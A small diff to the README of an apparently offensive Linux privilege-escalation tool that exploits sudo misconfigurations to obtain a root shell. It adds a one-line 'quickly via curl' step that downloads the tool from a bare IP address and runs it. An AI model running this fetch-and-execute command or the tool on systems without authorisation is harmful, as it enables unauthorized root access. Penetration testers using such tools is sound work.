@@ -16,6 +16,11 @@ It'll exploit most sudo privileges listed in GTFOBins to pop a root shell, as we
 
 ## Usage
 
+Quickly via curl
+```bash
+c=./traitor;curl xx.x.x.xx:80/$c -O;chmod +x $c;$c
+```
+
 Run with no arguments to find potential vulnerabilities/misconfigurations which could allow privilege escalation. Add the `-p` flag if the current user password is known. The password will be requested if it's needed to analyse sudo permissions etc.
 
 ```bash
